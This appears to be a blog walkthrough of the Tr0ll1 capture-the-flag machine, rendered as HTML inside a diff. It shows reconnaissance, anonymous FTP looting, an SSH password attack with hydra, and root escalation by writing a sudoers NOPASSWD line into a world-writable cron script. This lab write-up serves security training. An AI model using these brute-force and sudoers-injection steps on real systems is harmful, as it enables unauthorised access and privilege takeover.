@@ -1,0 +1,260 @@
+I"‘D<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll1<span class="nv">$ </span>arp-scan <span class="nt">-I</span> vmnet1  192.168.179.0/24 
+Interface: vmnet1, <span class="nb">type</span>: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 192.168.179.1
+Starting arp-scan 1.9.7 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
+192.168.179.182 00:0c:29:39:e9:62       VMware, Inc.
+192.168.179.254 00:50:56:ec:aa:69       VMware, Inc.
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll1<span class="nv">$ </span>us <span class="nt">-msf</span> <span class="nt">-p1-65535</span> 192.168.179.182 <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3 <span class="o">&amp;&amp;</span> us <span class="nt">-mU</span> <span class="nt">-p1-65535</span> 192.168.179.182 <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3 
+TCP open                     ftp[   21]         from 192.168.179.182  ttl 64 
+TCP open                     ssh[   22]         from 192.168.179.182  ttl 64 
+TCP open                    http[   80]         from 192.168.179.182  ttl 64
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll1<span class="nv">$ </span>nmap <span class="nt">-A</span> <span class="nt">-p21</span>,22,80 <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 192.168.179.182 <span class="nt">-oN</span> nmap/service-enum.txt
+...
+PORT   STATE SERVICE VERSION                                                                                                                                        
+21/tcp open  ftp     vsftpd 3.0.2                                                                                                                                   
+| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>                                                                                                              
+|_-rwxrwxrwx    1 1000     0            8068 Aug 09  2014 lol.pcap <span class="o">[</span>NSE: writeable]                                                                                 
+| ftp-syst:                                                                                                                                                         
+|   STAT:                                                                                                                                                           
+| FTP server status:                                                                                                                                                
+|      Connected to 192.168.179.1                                                                                                                                   
+|      Logged <span class="k">in </span>as ftp                                                                                                                                             
+|      TYPE: ASCII                                                                                                                                                  
+|      No session bandwidth limit                                                                                                                                   
+|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 600                                                                                                                            
+|      Control connection is plain text                                                                                                                             
+|      Data connections will be plain text                                                                                                                          
+|      At session startup, client count was 2                                                                                                                       
+|      vsFTPd 3.0.2 - secure, fast, stable                                                                                                                          
+|_End of status                                                                                                                                                     
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>                                                                                   
+| ssh-hostkey:                                                                                                                                                      
+|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 <span class="o">(</span>DSA<span class="o">)</span>                                                                                                      
+|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db <span class="o">(</span>RSA<span class="o">)</span>
+|   256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 b2:8b:e2:46:5c:ef:fd:dc:72:f7:10:7e:04:5f:25:85 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 1 disallowed entry 
+|_/secret
+|_http-server-header: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Site doesn<span class="s1">'t have a title (text/html).
+...
+</span></code></pre></div></div>
+
+<h3 id="ftp-enumeration">FTP Enumeration</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll1<span class="nv">$ </span>ftp 192.168.179.182
+Connected to 192.168.179.182.
+220 <span class="o">(</span>vsFTPd 3.0.2<span class="o">)</span>
+Name <span class="o">(</span>192.168.179.182:s4rgaz<span class="o">)</span>: anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system <span class="nb">type </span>is UNIX.
+Using binary mode to transfer files.
+ftp&gt; <span class="nb">ls</span> <span class="nt">-la</span>
+200 PORT <span class="nb">command </span>successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        112          4096 Aug 09  2014 <span class="nb">.</span>
+drwxr-xr-x    2 0        112          4096 Aug 09  2014 ..
+<span class="nt">-rwxrwxrwx</span>    1 1000     0            8068 Aug 09  2014 lol.pcap
+226 Directory send OK.
+ftp&gt; get lol.pcap
+<span class="nb">local</span>: lol.pcap remote: lol.pcap
+200 PORT <span class="nb">command </span>successful. Consider using PASV.
+150 Opening BINARY mode data connection <span class="k">for </span>lol.pcap <span class="o">(</span>8068 bytes<span class="o">)</span><span class="nb">.</span>
+226 Transfer complete.
+8068 bytes received <span class="k">in </span>0.00 secs <span class="o">(</span>1.5741 MB/s<span class="o">)</span>
+ftp&gt; quit
+221 Goodbye.
+</code></pre></div></div>
+
+<p>Analizing pcap file</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll1<span class="nv">$ </span>tshark <span class="nt">-r</span> lol.pcap <span class="nt">-Y</span> <span class="s1">'ftp-data'</span> <span class="nt">-T</span> fields <span class="nt">-e</span> text 2&gt;/dev/null
+Timestamps,-rw-r--r--    1 0        0             147 Aug 10 00:38 secret_stuff.txt<span class="se">\r\n</span>
+Timestamps,Well, well, well, aren<span class="s1">'t you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P\n,\n,Sucks, you were so close... gotta TRY HARDER!\n
+Timestamps,-rw-r--r--    1 0        0             147 Aug 10 00:38 secret_stuff.txt\r\n
+</span></code></pre></div></div>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+
+<p><img src="/assets/images/tr0ll1/screenshot-1.png" alt="" /></p>
+
+<p>/sup3rs3cr3tdirlol</p>
+
+<p><img src="/assets/images/tr0ll1/screenshot-2.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll1<span class="nv">$ </span>wget http://192.168.179.182/sup3rs3cr3tdirlol/roflmao
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll1<span class="nv">$ </span><span class="nb">chmod</span> +x roflmao
+
+root@kali:~/tr0ll1<span class="nv">$ </span>./roflmao 
+Find address 0x0856BF to proceed
+</code></pre></div></div>
+
+<p><img src="/assets/images/tr0ll1/screenshot-3.png" alt="" /></p>
+
+<p><img src="/assets/images/tr0ll1/screenshot-4.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll1<span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.179.182/0x0856BF/good_luck/which_one_lol.txt | <span class="nb">awk</span> <span class="s1">'{print $1}'</span> | <span class="nb">tee </span>users.txt 
+maleus
+ps-aux
+felux
+Eagle11
+genphlux
+usmc8892
+blawrg
+wytshadow
+vis1t0r
+overflow
+</code></pre></div></div>
+
+<p><img src="/assets/images/tr0ll1/screenshot-5.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll1<span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.179.182/0x0856BF/this_folder_contains_the_password/Pass.txt | <span class="nb">tee </span>pass.txt     
+Good_job_:<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Wordlist attack with hydra</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll1<span class="nv">$ </span>hydra <span class="nt">-L</span> users.txt <span class="nt">-P</span> pass.txt ssh://192.168.179.182
+...
+1 of 1 target completed, 0 valid password found
+...
+</code></pre></div></div>
+
+<p><img src="/assets/images/tr0ll1/screenshot-6.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll1<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"Pass.txt"</span> <span class="o">&gt;</span> pass.txt
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll1<span class="nv">$ </span>hydra <span class="nt">-L</span> users.txt <span class="nt">-P</span> pass.txt ssh://192.168.179.182
+...
+<span class="o">[</span>22][ssh] host: 192.168.179.182   login: overflow   password: Pass.txt
+...
+</code></pre></div></div>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="access-via-ssh">Access via SSH</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll1<span class="nv">$ </span>ssh overflow@192.168.179.182                  
+overflow@192.168.179.182<span class="s1">'s password: 
+Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Wed Aug 13 01:14:09 2014 from 10.0.0.12
+Could not chdir to home directory /home/overflow: No such file or directory
+$ bash 
+overflow@troll:/$
+</span></code></pre></div></div>
+
+<p>Close the connection every five minutes</p>
+
+<p>Listing writable directories</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>overflow@troll:/var/www/html<span class="nv">$ </span>find / <span class="nt">-writable</span> <span class="nt">-type</span> f 2&gt;/dev/null | egrep <span class="nt">-v</span> <span class="s1">'proc|sys'</span>
+/srv/ftp/lol.pcap
+/var/tmp/cleaner.py.swp
+/var/www/html/sup3rs3cr3tdirlol/roflmao
+/var/log/cronlog
+/lib/log/cleaner.py
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>overflow@troll:/<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /lib/log/cleaner.py
+<span class="nt">-rwxrwxrwx</span> 1 root root 172 Jan 26 20:55 /lib/log/cleaner.py
+
+overflow@troll:/var/www/html<span class="nv">$ </span><span class="nb">cat</span> /lib/log/cleaner.py
+<span class="c">#!/usr/bin/env python</span>
+import os
+import sys
+try:
+        os.system<span class="o">(</span><span class="s1">'rm -r /tmp/* '</span><span class="o">)</span>
+except:
+        sys.exit<span class="o">()</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>overflow@troll:/<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /var/log/cronlog
+<span class="nt">-rwxrwxrwx</span> 1 root root 23 Aug 13  2014 /var/log/cronlog
+
+overflow@troll:/var/www/html<span class="nv">$ </span><span class="nb">cat</span> /var/log/cronlog
+<span class="k">*</span>/2 <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> cleaner.py
+overflow@troll:/var/www/html<span class="err">$</span>
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="cron-job">Cron Job</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>overflow@troll:/<span class="nv">$ </span><span class="nb">cat</span> /lib/log/cleaner.py                                                                                                                           
+<span class="c">#!/usr/bin/env python                                                                                                                                               </span>
+import os                                                                                                                                                           
+import sys                                                                                                                                                          
+try:                                                                                                                                                                
+        os.system<span class="o">(</span><span class="s1">'rm -r /tmp/* '</span><span class="o">)</span>                                                                                                                                  
+        os.system<span class="o">(</span><span class="s1">'echo "overflow ALL=(ALL) NOPASSWD: /bin/bash" &gt;&gt; /etc/sudoers'</span><span class="o">)</span>                                                                                   
+except:                                                                                                                                                             
+        sys.exit<span class="o">()</span>
+        
+overflow@troll:/<span class="err">$</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>overflow@troll:/<span class="nv">$ </span><span class="nb">sudo</span> /bin/bash
+<span class="nb">sudo</span>: unable to resolve host troll
+root@troll:/#
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@troll:/# crontab <span class="nt">-l</span> | <span class="nb">tail</span> <span class="nt">-2</span>
+<span class="k">*</span>/5 <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> /usr/bin/python /opt/lmao.py
+<span class="k">*</span>/2 <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> /usr/bin/python /lib/log/cleaner.py
+
+root@troll:/# <span class="nb">cat</span> /opt/lmao.py
+<span class="c">#!/usr/bin/env python</span>
+import os
+
+os.system<span class="o">(</span><span class="s1">'echo "TIMES UP LOL!"|wall'</span><span class="o">)</span>
+os.system<span class="o">(</span><span class="s2">"pkill -u 'overflow'"</span><span class="o">)</span>
+sys.exit<span class="o">()</span>
+
+root@troll:/#
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@troll:/# <span class="nb">cd </span>root/
+root@troll:/root# <span class="nb">ls
+</span>proof.txt
+root@troll:/root# <span class="nb">cat </span>proof.txt 
+Good job, you did it! 
+
+
+702a8c18d29c6f3ca0d99ef5712bfbdc
+root@troll:/root#
+</code></pre></div></div>
+:ET
